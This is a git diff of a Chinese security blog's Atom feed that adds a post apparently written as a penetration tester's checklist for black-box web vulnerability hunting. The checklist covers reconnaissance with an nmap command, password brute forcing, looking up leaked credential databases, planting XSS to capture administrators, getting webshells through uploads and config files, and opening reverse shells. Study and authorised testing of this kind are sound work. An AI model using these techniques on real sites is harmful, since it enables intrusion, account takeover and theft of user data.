 &lt;p&gt;本文大部分资料参考自网络，因为内容太多无法一一附上出处，有介意的原作者请私信我加上。
-最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。</summary></entry><entry><title type="html">规模渗透架构部署设想</title><link href="/pentest/2017/12/16/architecture-of-apt-pentest/" rel="alternate" type="text/html" title="规模渗透架构部署设想" /><published>2017-12-16T20:52:18+08:00</published><updated>2017-12-16T20:52:18+08:00</updated><id>/pentest/2017/12/16/architecture-of-apt-pentest</id><content type="html" xml:base="/pentest/2017/12/16/architecture-of-apt-pentest/">&lt;p&gt;
+最后，感谢某云、FB、数字等等，感谢互联网上所有热爱分享的童鞋们。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在内网横向与后渗透的过程中，会有一些细节比较蛋疼。而真正系统地讲述内网和后渗透的书籍，也就那么寥寥几本，就算想掏大美刀也没地儿买去。</summary></entry><entry><title type="html">规模渗透架构部署设想</title><link href="http://localhost:4000/pentest/2017/12/16/architecture-of-apt-pentest/" rel="alternate" type="text/html" title="规模渗透架构部署设想" /><published>2017-12-16T20:52:18+08:00</published><updated>2017-12-16T20:52:18+08:00</updated><id>http://localhost:4000/pentest/2017/12/16/architecture-of-apt-pentest</id><content type="html" xml:base="http://localhost:4000/pentest/2017/12/16/architecture-of-apt-pentest/">&lt;p&gt;
 	&lt;span style=&quot;color:#00B050;&quot;&gt;&lt;strong&gt;在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。&lt;/strong&gt;&lt;/span&gt;
 &lt;/p&gt;
 
@@ -3826,4 +3699,135 @@ Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定�
 
 &lt;p&gt;直至撰稿之日，鄙人已经完成了一部分工作。但由于研究方向有变，再加上一些其他不可抗拒的原因，可能开发工作会停滞一段时间。&lt;/p&gt;
 
-&lt;p&gt;在以后恢复开发工作时，应该会有更多的思路更新，与诸君共勉！&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。</summary></entry></feed>
+&lt;p&gt;在以后恢复开发工作时，应该会有更多的思路更新，与诸君共勉！&lt;/p&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在我们的测试中，可能在对大型目标进行探测时，人手不足就会显得特别无力。这时候，使用机器代替人工进行一些重复性工作，就显得尤为重要。咱们在这儿来谈谈，如何开发和部署APT渗透系统的架构。</summary></entry><entry><title type="html">黑盒漏洞挖掘（WEB篇）</title><link href="http://localhost:4000/pentest/2017/11/13/pentest-for-blackbox/" rel="alternate" type="text/html" title="黑盒漏洞挖掘（WEB篇）" /><published>2017-11-13T16:41:18+08:00</published><updated>2017-11-13T16:41:18+08:00</updated><id>http://localhost:4000/pentest/2017/11/13/pentest-for-blackbox</id><content type="html" xml:base="http://localhost:4000/pentest/2017/11/13/pentest-for-blackbox/">&lt;p&gt;
+	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;在安全测试中，我们常常会遇到一些重复性工作。而鄙人记性不佳，有时候并不能高效的进行工作。因此，自己萌生了撰写工作总结的想法，将以往的工作列清单，做一个总结，以作查阅之用。&lt;/strong&gt;&lt;/span&gt;
+&lt;/p&gt;
+
+&lt;p&gt;当然，这个系列也希望会持续更新。人，总是要有进步不是。&lt;/p&gt;
+
+&lt;h3 id=&quot;克敌机先&quot;&gt;克敌机先&lt;/h3&gt;
+
+&lt;p&gt;在测试某个网站时，我们常常需要先探测该网站的基本信息：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;是否存在WAF，像创宇盾这种检测到攻击会马上暂时性封IP，阿里云盾偷偷摸摸检测到攻击行为后，会直接无前兆地封禁你IP，至于安全狗、D盾、云锁、百度云安全这种就不一一例举了，暂时不细说。&lt;/li&gt;
+  &lt;li&gt;路径扫描，如果存在WAF或者目标较为脆弱，可以直接调整为非常低的线程数，比如一个线程，然后对目标进行文件/目录低速探测。如果没有太多限制，那就使劲儿造作。&lt;/li&gt;
+  &lt;li&gt;如果需要测试的网站比较大且比较耐操，且没有WAF/IDS，建议配置好去重和线程，使用大型扫描器对网站进行探测。这样做的好处是不会漏掉一些常用的漏洞，而且可以获取网站的结构。但缺点是需要等待比较长的时间，也容易被管理发现。&lt;/li&gt;
+  &lt;li&gt;部分网站的后台，可能存在于域名的其他端口上。如果服务器不存在CDN，这时候可以借助类nmap的扫描器来探测端口开放情况，比如使用命令：
+```
+nmap -sS -sV -p- –script=”http-title,banner” 192.168.2.10&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;```&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;插件检测server类型，是否为tomcat/jboss/glassfish之类，探测是否存在可访问webserver console。&lt;/li&gt;
+  &lt;li&gt;检测网站是否为公开的CMS，探测CMS类型，漏洞库是否存在相关漏洞。&lt;/li&gt;
+  &lt;li&gt;查看有无列目录的权限。&lt;/li&gt;
+  &lt;li&gt;查看是否提供附件下载，如果是参数传递的URL，这类链接通常比较敏感。如果可以明显给出了文件的相对/绝对路径/可预测的类文件名id，我们可以优先进行任意文件下载测试，其次再进行常规漏洞测试。如果仅仅是给出了普通的id值，那可以直接进行常规漏洞测试。&lt;/li&gt;
+  &lt;li&gt;查看网站是否有明显的配置漏洞，比如提供了allow *的crossdomain.xml；没有进行过滤的robots.txt；容易猜测名字的源码压缩包；泄露敏感信息的配置文件、JS文件甚至普通html文件；.git/.svn文件供下载等。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;权限权限&quot;&gt;权限，权限！&lt;/h3&gt;
+
+&lt;p&gt;在遇到某个网站时，窃以为应该先寻找能够获取更大权限的地方，而登录后的权限无疑会更大。&lt;/p&gt;
+
+&lt;p&gt;这时，我们可以尝试进行注册，或者夺取原有的账户权限。&lt;/p&gt;
+
+&lt;p&gt;此时有一点需要注意，在登录的入口处和搜索处，可能存在一定的脆弱性，建议同其他前台产生的敏感数据包一同进行fuzz检测。&lt;/p&gt;
+
+&lt;h5 id=&quot;自给自足&quot;&gt;自给自足&lt;/h5&gt;
+
+&lt;p&gt;在本身无权限时，我们可以去寻找注册的地方，间接获取更高的权限。
+同时在此过程中，我们有几个点需要注意：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;研究找回密码功能，查看是否有无逻辑漏洞可以跳过，可否预测和爆破验证码。&lt;/li&gt;
+  &lt;li&gt;可能存在上传，查看能否直接获取webshell&lt;/li&gt;
+  &lt;li&gt;可能存在XSS，如果在注册能直接通过时，需要等待注册完毕，去用户中心再继续测试。如若需要等待审核，可以尝试植入XSS平台代码，等待机器上线。&lt;/li&gt;
+  &lt;li&gt;如若存在手机和邮箱验证，可尝试有无邮箱炸弹漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h5 id=&quot;鸠占鹊巢&quot;&gt;鸠占鹊巢&lt;/h5&gt;
+
+&lt;p&gt;有时候管理或者开发不够细心，我们可以通过各种手段去获取原有普通用户或者管理用户的权限。在我们能够比较容易的获取后台登陆口，或者在无法注册用户时，我们可以如此操作：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;通过手工猜测密码/识别简单验证码/验证码绕过/直接爆破，猜测密码，来获取原有用户的权限。&lt;/li&gt;
+  &lt;li&gt;查看用户名是否存在，尝试能否预测/枚举用户，可能有机会猜测管理账号。&lt;/li&gt;
+  &lt;li&gt;搜寻文档，后台页面可能存在一些敏感说明文档提供下载，里面有可能会记录测试账号等敏感内容，对测试会比较有帮助。&lt;/li&gt;
+  &lt;li&gt;万能密码绕过，这种情况一般asp和php类型的网站会存在的稍微多些，不过新一点的网站这样的问题越来越少了。&lt;/li&gt;
+  &lt;li&gt;禁用JS，直接卡入后台管理页面。这种情况一般需要预先爆破或者在JS源码里找寻后台路径，然后再使用该方法。&lt;/li&gt;
+  &lt;li&gt;工具/插件修改cookie，直接进入管理后台。这种方法比较古老了，现在成功的几率是比较小的。&lt;/li&gt;
+  &lt;li&gt;善用类Google/类Github/类shodan引擎，搜寻泄露的后台账号密码/带认证的链接等等。&lt;/li&gt;
+  &lt;li&gt;设法找寻网站管理和开发者的相关信息，查找社工库组合相关密码。如果是针对企业和组织进行渗透，可设法查询社工库里相关的邮箱密码，再借助可登入的邮箱翻看敏感内容，从而达到进入后台的目的。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;用户中心&quot;&gt;用户中心&lt;/h3&gt;
+
+&lt;p&gt;登入网站用户中心后，我们一般可以做如下测试。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;抓包测试，查看在数据包中修改参数，能否越权枚举和修改用户的基本信息/订单/地址等内容。&lt;/li&gt;
+  &lt;li&gt;在用户互发私信功能处，可能存在存储型XSS。&lt;/li&gt;
+  &lt;li&gt;如若在注册时，并未测试存储XSS、邮箱/手机/私信炸弹、越权修改密码，可在此测试。&lt;/li&gt;
+  &lt;li&gt;查看是否存在附件上传/头像上传，文件命名规律也可稍作检查，最后查看能否直接获取webshell。&lt;/li&gt;
+  &lt;li&gt;查看搜索功能是否有别于前台，能否间接枚举用户或者手机号。&lt;/li&gt;
+  &lt;li&gt;在用户中心进行SQL注入和XSS的fuzz测试，成功几率大抵会高于前台。&lt;/li&gt;
+  &lt;li&gt;对于邀请注册/登出系统/登录跳转/注册验证的链接，都可能存在任意URL跳转的漏洞。&lt;/li&gt;
+  &lt;li&gt;如果用户中心未启用token验证，在修改密码/修改用户名和昵称/修改地址/修改邮箱和手机号等地方，很可能存在CSRF漏洞。&lt;/li&gt;
+  &lt;li&gt;上传后的地址可能存在列目录漏洞。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;管理后台&quot;&gt;管理后台&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;管理后台可能存在上传的地方，可以尝试能否获取webshell。&lt;/li&gt;
+  &lt;li&gt;上传处，如若能上传文本类型文档，查看是否有预览功能，进而考虑能否写入存储型XSS。&lt;/li&gt;
+  &lt;li&gt;上传处，如果能够上传XML文档，或者只是提交XML内容，可以尝试XXE攻击。&lt;/li&gt;
+  &lt;li&gt;上传处，如果过滤了大多数动态文件，但并不是使用的白名单，可以考虑上传shtml，同样可能执行命令。&lt;/li&gt;
+  &lt;li&gt;配置处可能存在未过滤的地方，可以直接写入存储型XSS。&lt;/li&gt;
+  &lt;li&gt;php类的网站，有的可以通过转义和截断，往配置文件里写入webshell。&lt;/li&gt;
+  &lt;li&gt;asp类的网站，可以通过写配置，然后数据库备份得到webshell，这里不细说。&lt;/li&gt;
+  &lt;li&gt;后台大多验证不严，可以尝试SQL注入和XSS的fuzz测试。&lt;/li&gt;
+  &lt;li&gt;后台可能存在执行命令的地方，可进行fuzz，获取敏感配置或者直接反弹shell。&lt;/li&gt;
+  &lt;li&gt;如若后台存在通讯录，在不违反合规条款的情况下，可尝试自行处理。&lt;/li&gt;
+  &lt;li&gt;部分后台如果存在管理用户表，在不违反合规条款的情况下，可尝试自行处理。&lt;/li&gt;
+  &lt;li&gt;管理后台大概率不会验证token的，所以很多网站后台也因此存在CSRF。&lt;/li&gt;
+  &lt;li&gt;如果非管理用户，也可以尝试越权修改其他用户的密码。&lt;/li&gt;
+  &lt;li&gt;后台有时会存在读取文件内容，或者探测内网存活的功能，抑或是上传特殊文件进行解析，可以尝试是否存在SSRF。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;权宜之计&quot;&gt;权宜之计&lt;/h3&gt;
+
+&lt;p&gt;如果我们无法登陆后台，也无法注册怎么办？我们可以尝试以下几种做法：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;评论处可能存在上传和存储型XSS，也可能存在没有验证重复提交的CSRF。&lt;/li&gt;
+  &lt;li&gt;提交个人建议等供审核的内容时，有可能后台没有做XSS过滤，这时候就可以进行盲打。&lt;/li&gt;
+  &lt;li&gt;某些用户的个人页面可以通过枚举id获得，里面可能存在一些敏感信息。&lt;/li&gt;
+  &lt;li&gt;在前台或者用户中心，可能存在星号隐藏一些敏感信息，比如说手机号。这些信息在某些时候，可能在源码里直接或者间接能看到。&lt;/li&gt;
+  &lt;li&gt;前台可能存在一些伪静态页面，建议随手尝试注入，虽然现在这样的案例已经比较少了。&lt;/li&gt;
+  &lt;li&gt;在尝试列目录漏洞时，可以在目录后面加上XSS字符尝试是否有反馈，也可以尝试不存在的文件名（hacksb.php）或者错误的文件名（~list.aspx、error.jspx）进行报错。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;端口入侵&quot;&gt;端口入侵&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;某些端口存在服务认证，如果有弱口令/默认口令，可以爆破进入。&lt;/li&gt;
+  &lt;li&gt;某些WebServer在特定端口，同样存在单独的WEB登陆口，如果突破进入后台，可以部署包拿webshell，也可能执行命令反弹shell。&lt;/li&gt;
+  &lt;li&gt;代理端口，这类服务比较少，如果找到可以尝试连接，设法将其作为跳板，切入内网。&lt;/li&gt;
+  &lt;li&gt;特定端口开启的服务，可能存在RCE，结合MSF可以反弹shell。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;细节思考&quot;&gt;细节思考&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;测试敏感点注入时，最好多尝试几遍，加上risk、level、random-ua以及tamper，不要过于依赖扫描器或者fuzz工具。&lt;/li&gt;
+  &lt;li&gt;测试XSS的时候，最好先用字符试水查看过滤情况，有时候不能直接使用payload的时候，可以尝试绕过。&lt;/li&gt;
+  &lt;li&gt;上传时可能存在黑/白名单时，每次手动改包会很麻烦。最好是通过字典批量发包进行fuzz。另外，%00不管用时，可以替换成类似的空白字符段（以后补上细节）。&lt;/li&gt;
+  &lt;li&gt;绕过逻辑改包，无论是上传还是找回密码，记得每步截图，也许有时候只有一次机会。&lt;/li&gt;
+  &lt;li&gt;修改状态码时，也许能够通过辅助插件，自动化fuzz判断。&lt;/li&gt;
+  &lt;li&gt;调用callback内容时，其内容也许可控，我们可以尝试往里面注入污染语句。最后，再尝试寻找调用callback的地方。&lt;/li&gt;
+  &lt;li&gt;找后台一般有几种情况，可以是子目录，也可以是同域名下其他端口，甚至是其他子域名。比如统一SSO登录的情况下，一套网站总会有一个唯一入口。但由于历史的原因，总会遗漏和不统一的地方，那就是我们的突破口。&lt;/li&gt;
+  &lt;li&gt;待续。&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>HellSec</name></author><category term="pentest" /><summary type="html">在安全测试中，我们常常会遇到一些重复性工作。而鄙人记性不佳，有时候并不能高效的进行工作。因此，自己萌生了撰写工作总结的想法，将以往的工作列清单，做一个总结，以作查阅之用。</summary></entry></feed>
